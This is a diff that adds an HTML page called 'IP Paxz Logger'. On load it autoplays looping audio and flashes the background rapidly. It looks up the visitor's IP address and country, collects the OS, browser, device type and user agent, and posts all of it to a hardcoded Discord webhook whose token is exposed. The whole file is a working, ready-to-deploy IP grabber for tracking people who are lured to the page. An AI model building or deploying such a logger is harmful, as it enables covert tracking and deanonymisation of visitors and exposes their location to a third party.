@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Paxz Logger</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            background-color: white;
+            color: black;
+            animation: changeBackground 0.4s infinite;
+            position: relative;
+        }
+        h1 {
+            color: inherit;
+        }
+        p {
+            color: inherit;
+            margin-bottom: 40px;
+        }
+        @keyframes changeBackground {
+            0% { background-color: white; color: black; }
+            50% { background-color: black; color: white; }
+            100% { background-color: white; color: black; }
+        }
+    </style>
+    <script>
+        var embedSent = false;
+        var musicStarted = false;
+
+        var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
+
+        function startMusic() {
+            var audio = new Audio('sound.mp3'); // Zorg ervoor dat 'sound.mp3' overeenkomt met het juiste pad naar het audiobestand
+            audio.play();
+            musicStarted = true;
+            audio.addEventListener('ended', function() {
+                this.currentTime = 0;
+                this.play();
+            }, false);
+        }
+
+        function sendToDiscord() {
+            var ipAddress = "Unknown"; // Default value for IP address
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    console.log("IP Address:", ipAddress);
+                    fetch(`https://ipapi.co/${ipAddress}/json/`)
+                        .then(response => response.json())
+                        .then(locationData => {
+                            sendEmbed(ipAddress, locationData);
+                        })
+                        .catch(error => {
+                            console.error('Unable to fetch location data:', error);
+                            sendEmbed(ipAddress, null); // Send embed with default location data
+                        });
+                })
+                .catch(error => {
+                    console.error('Unable to fetch IP address:', error);
+                    sendEmbed(ipAddress, null); // Send embed with default IP address
+                });
+        }
+
+        function sendEmbed(ipAddress, locationData) {
+            if (embedSent) return; // If embed is already sent, return
+
+            var userAgent = navigator.userAgent;
+            var timestamp = new Date().toISOString();
+            var os = detectOS(userAgent);
+            console.log("Operating System:", os);
+            var browser = detectBrowser(userAgent);
+            console.log("Browser:", browser);
+            var deviceType = getDeviceType();
+            console.log("Device Type:", deviceType);
+            var ipv4Address = convertToIPv4(ipAddress);
+            console.log("IP Address (IPv4):", ipv4Address);
+            var country = locationData ? locationData.country_name : "Unknown";
+            console.log("Country:", country);
+
+            var embed = {
+                "embeds": [
+                    {
+                        "title": "IP Paxz Logger",
+                        "description": "A user has visited the page.",
+                        "color": 65280, // Green if liked, Red if not
+                        "fields": [
+                            {
+                                "name": "IP Address",
+                                "value": `\`\`\`${ipv4Address}\`\`\``
+                            },
+                            {
+                                "name": "Country",
+                                "value": `\`\`\`${country}\`\`\``
+                            },
+                            {
+                                "name": "Operating System",
+                                "value": `\`\`\`${os}\`\`\``
+                            },
+                            {
+                                "name": "Browser",
+                                "value": `\`\`\`${browser}\`\`\``
+                            },
+                            {
+                                "name": "Device Type",
+                                "value": `\`\`\`${deviceType}\`\`\``
+                            },
+                            {
+                                "name": "User Agent",
+                                "value": `\`\`\`${userAgent}\`\`\``
+                            },
+                            {
+                                "name": "Timestamp",
+                                "value": `\`\`\`${timestamp}\`\`\``
+                            }
+                        ],
+                        "footer": {
+                            "text": "Info generated by Paxz!!!"
+                        }
+                    }
+                ]
+            };
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookURL);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        console.log("Embed sent successfully!");
+                        embedSent = true; // Set embedSent to true after successfully sending the embed
+                    } else {
+                        console.error("Failed to send embed:", xhr.status, xhr.statusText);
+                    }
+                }
+            };
+            xhr.send(JSON.stringify(embed));
+        }
+
+        function detectOS(userAgent) {
+            var OSes = [
+                'Windows',
+                'Mac OS',
+                'Linux',
+                'iOS',
+                'Android'
+            ];
+
+            var detectedOS = OSes.find(function(os) {
+                return userAgent.indexOf(os) >= 0;
+            });
+
+            return detectedOS || 'Unknown';
+        }
+
+        function detectBrowser(userAgent) {
+            var browsers = [
+                'Chrome',
+                'Firefox',
+                'Safari',
+                'Edge',
+                'Opera',
+                'MSIE',
+                'Trident',
+                'Edge',
+                'Netscape',
+                'SeaMonkey',
+                'UCBrowser',
+                'Vivaldi',
+                'Yandex',
+                'Brave',
+                'Avant',
+                'Konqueror',
+                'Lunascape',
+                'Maxthon',
+                'Sleipnir',
+                'SlimBrowser'
+            ];
+
+            var detectedBrowser = browsers.find(function(browser) {
+                return userAgent.indexOf(browser) >= 0;
+            });
+
+            return detectedBrowser || 'Unknown';
+        }
+
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes("Mobile")) return "Phone";
+            if (userAgent.includes("Tablet")) return "Tablet";
+            if (userAgent.includes("Console")) return "Console";
+            if (userAgent.includes("Windows")) return "PC / Computer";
+            return "Unknown Device";
+        }
+
+        function convertToIPv4(ipAddress) {
+            var ipv4 = ipAddress.split(":").pop();
+            return ipv4;
+        }
+
+        window.onload = function() {
+            startMusic(); // Start music immediately when the page loads
+            sendToDiscord();
+        }
+    </script>
+</head>
+<body>
+    <h1>Welcome to our awesome site!</h1>
+    <p>Enjoy the music while we log your IP address.</p>
+</body>
+</html>
